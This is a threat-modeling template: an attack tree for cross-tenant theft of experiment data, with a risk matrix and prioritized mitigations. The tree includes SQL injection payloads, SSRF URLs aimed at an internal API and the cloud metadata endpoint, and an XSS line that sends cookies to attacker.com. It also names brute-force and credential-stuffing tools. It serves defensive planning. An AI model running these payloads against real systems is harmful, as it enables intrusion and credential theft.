# 🌳 Attack Tree -Style Research Data Breach

> Attack tree showing all paths an attacker could take to access
> proprietary experiment data from a multi-tenant research platform.
> Use this as a template for threat modeling sessions.

\---

## ATTACK GOAL: Access Org B's Experiment Data as Org A User

```
\[ROOT GOAL]
Steal Org B's proprietary experiment data
│
├── \[OR] 1. Exploit application vulnerabilities
│   │
│   ├── \[OR] 1.1 Broken Access Control (IDOR)
│   │   │   Likelihood: HIGH | Impact: Critical | Risk: 🔴
│   │   ├── 1.1.1 Enumerate experiment IDs (GET /api/experiments/{id})
│   │   │         Tool: Burp Intruder, range payload 1–10000
│   │   │         Mitigation: Org-scoped authorization check
│   │   │
│   │   └── 1.1.2 Access shared report links without auth check
│   │             Tool: Manual — share link and strip auth
│   │             Mitigation: Token-based sharing with expiry
│   │
│   ├── \[OR] 1.2 SQL Injection
│   │   │   Likelihood: MEDIUM | Impact: Critical | Risk: 🔴
│   │   ├── 1.2.1 UNION-based SQLi in search parameter
│   │   │         Payload: ' UNION SELECT data FROM experiments--
│   │   │         Mitigation: Parameterized queries
│   │   │
│   │   └── 1.2.2 Blind time-based SQLi for data exfiltration
│   │             Payload: '; IF(1=1) WAITFOR DELAY '0:0:5'--
│   │             Mitigation: ORM + input validation
│   │
│   ├── \[OR] 1.3 SSRF to access internal data stores
│   │   │   Likelihood: MEDIUM | Impact: High | Risk: 🟠
│   │   ├── 1.3.1 SSRF to internal API → access experiment data
│   │   │         Payload: url=http://internal-api/experiments?org\_id=2
│   │   │         Mitigation: URL allowlist, block private IPs
│   │   │
│   │   └── 1.3.2 SSRF to cloud metadata → steal IAM credentials
│   │             Payload: url=http://169.254.169.254/latest/meta-data/
│   │             → Use AWS keys to query S3/RDS directly
│   │             Mitigation: Block 169.254.0.0/16, IMDSv2 required
│   │
│   └── \[OR] 1.4 Insecure Deserialization → RCE → DB access
│       │   Likelihood: LOW | Impact: Critical | Risk: 🔴
│       └── 1.4.1 Craft malicious pickle payload in session cookie
│                 → Get shell on app server → query DB directly
│                 Mitigation: Never pickle untrusted data
│
├── \[OR] 2. Account takeover
│   │
│   ├── \[OR] 2.1 Credential-based attacks
│   │   │
│   │   ├── 2.1.1 Password brute force (no rate limiting)
│   │   │         Tool: Burp Intruder + rockyou.txt
│   │   │         Mitigation: Rate limiting, lockout, MFA
│   │   │
│   │   ├── 2.1.2 Credential stuffing (leaked password list)
│   │   │         Tool: credmaster, bulletproof
│   │   │         Mitigation: MFA required, breach password check
│   │   │
│   │   └── 2.1.3 Password reset token enumeration
│   │             Test: Is reset token predictable? Sequential?
│   │             Mitigation: Cryptographically random tokens, short expiry
│   │
│   ├── \[OR] 2.2 Session-based attacks
│   │   │
│   │   ├── 2.2.1 JWT forgery (weak secret or alg:none)
│   │   │         Tool: jwt\_tool, hashcat
│   │   │         Mitigation: Strong secret, validate alg server-side
│   │   │
│   │   ├── 2.2.2 Session fixation attack
│   │   │         Test: Does session ID change on login?
│   │   │         Mitigation: Regenerate session ID after login
│   │   │
│   │   └── 2.2.3 XSS → cookie theft
│   │             Payload: <script>fetch('http://attacker.com?c='+document.cookie)</script>
│   │             Mitigation: XSS prevention + HttpOnly cookies
│   │
│   └── \[OR] 2.3 Phishing / social engineering
│       │   (Out of technical scope — addressed by security awareness training)
│       └── 2.3.1 Spear phish researcher with lookalike domain
│
├── \[OR] 3. Infrastructure / supply chain attack
│   │
│   ├── \[OR] 3.1 Vulnerable dependency exploitation
│   │   │   Likelihood: MEDIUM | Impact: High | Risk: 🟠
│   │   ├── 3.1.1 Known CVE in requirements.txt (no SCA scanning)
│   │   │         Example: PyYAML 3.12 → arbitrary code execution
│   │   │         Mitigation: Snyk/Dependabot SCA in CI
│   │   │
│   │   └── 3.1.2 Malicious PyPI package (typosquatting)
│   │             Example: 'requsts' instead of 'requests'
│   │             Mitigation: Lock file pinning, PyPI integrity check
│   │
│   └── \[OR] 3.2 Cloud misconfiguration
│       │
│       ├── 3.2.1 Public S3 bucket — experiment files exposed
│       │         Test: aws s3 ls s3://-experiments --no-sign-request
│       │         Mitigation: Block public access, bucket policy
│       │
│       └── 3.2.2 Overprivileged IAM role → access all org data
│                 Test: List all IAM permissions on app role
│                 Mitigation: Least privilege, permission boundaries
│
└── \[OR] 4. Insider threat
    │   (Security controls differ — DLP, audit logging, HR processes)
    └── 4.1 Legitimate user with org\_id manipulation in API
              Mitigation: Server-side org binding, audit logging
```

\---

## RISK MATRIX

|Attack Path|Likelihood|Impact|Risk|Priority|
|-|-|-|-|-|
|1.1 IDOR|High|Critical|🔴 Critical|P0|
|1.2 SQL Injection|Medium|Critical|🔴 Critical|P0|
|1.3.2 SSRF → AWS metadata|Medium|Critical|🔴 Critical|P0|
|2.2.1 JWT forgery|Medium|Critical|🔴 Critical|P0|
|2.1.1 Brute force|High|High|🟠 High|P1|
|2.2.3 XSS → cookie theft|Medium|High|🟠 High|P1|
|3.1.1 Vulnerable dependency|Medium|High|🟠 High|P1|
|3.2.1 Public S3 bucket|Low|Critical|🟠 High|P1|
|1.4 Deserialization RCE|Low|Critical|🟠 High|P1|
|3.2.2 Overprivileged IAM|Low|High|🟡 Medium|P2|
|2.1.3 Password reset enum|Medium|Medium|🟡 Medium|P2|

\---

## MITIGATIONS SUMMARY

### Must implement (P0 — before launch)

1. Org-scoped authorization on every API endpoint (`experiment.org\_id == user.org\_id`)
2. Parameterized queries everywhere — no string concatenation in SQL
3. URL allowlist + block metadata IPs in any URL-fetch feature
4. JWT: validate algorithm server-side, strong secret (≥256-bit), short expiry

### Should implement (P1 — within sprint)

5. Rate limiting on authentication endpoints (5 attempts/minute/IP)
6. XSS prevention: escape output, CSP header, HttpOnly cookies
7. SCA scanning in CI (Snyk/Dependabot) — block on Critical CVEs
8. S3 bucket public access block + audit all bucket policies

### Nice to have (P2 — next quarter)

9. Least-privilege IAM review — remove unused permissions
10. Password reset token security audit — entropy, expiry, single-use
11. Penetration test — quarterly, external firm

